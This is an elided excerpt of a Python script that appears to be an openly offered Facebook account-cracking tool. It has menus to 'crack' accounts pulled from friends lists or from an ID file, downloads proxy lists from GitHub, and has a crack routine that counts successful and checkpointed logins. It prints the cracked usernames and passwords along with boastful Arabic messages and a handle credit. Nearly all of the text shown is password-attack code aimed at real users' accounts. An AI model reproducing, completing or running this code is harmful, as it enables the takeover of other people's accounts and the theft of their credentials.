...
princp=[]
try:
    prox= requests.get('https://github.com/Dev-S5/GOLD/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
    prox= requests.get('https://github.com/Dev-S5/GOLD/blob/main/prox2.txt').text
    open('.prox2.txt','w').write(prox)
...
def menu(my_name,my_id):
	...
	print('\033[0;1m[ \033[31;1m1 \033[0;1m] 𝐂𝐑𝐀𝐂𝐊 𝐏𝐔𝐁𝐋𝐈𝐂 من الاصدقاء')
	print('\033[0;1m[ \033[31;1m2 \033[0;1m] 𝐂𝐑𝐀𝐂𝐊  𝐅𝐈𝐋𝐄 من ملف')
	print('\033[0;1m[ \033[31;1m0 \033[0;1m] 𝐄𝐗𝐈𝐓 𝐂𝐎𝐊الخروج من الحساب ')
	print(47*'\033[1;31m▬\033[1;37m') 				
...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	print(47*'\x1b[38;5;220m▬\x1b[38;5;220m')
	print('>> 1. Mobile ')
	print(47*'\x1b[38;5;220m▬\x1b[38;5;220m')
	hc = input('» Chose : ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print(47*'\x1b[1;32m▬\x1b[1;32m')
	_jembot_ = input('>> Add App : اظهار التطبيقات المرتبطه ( Y/t ) ')
	print(47*'\x1b[38;5;52m▬\x1b[38;5;52m')
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	print(47*'\x1b[38;5;44m▬\x1b[38;5;44m')
...
def passwrd():
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}[=]{k} ياعمري حلبتها كافي {x} <> ')
		time.sleep(2)
...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write(f"\r ▄︻デ══━一  {a35}{b}{loop}{a33}•{a31}{len(id)}{a30}  • OK:{a25}{a26}{ok}{a40} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𓆩3 B S𓆪✘ 
⋘─────━𓆩3 B S𓆪━─────⋙
عبس جابلك حساب سكيور جربه يجوز يفتح 
❖➥ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖➥ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
⋘─────━𓆩3 B S𓆪━─────⋙
PY → @OP3PP		
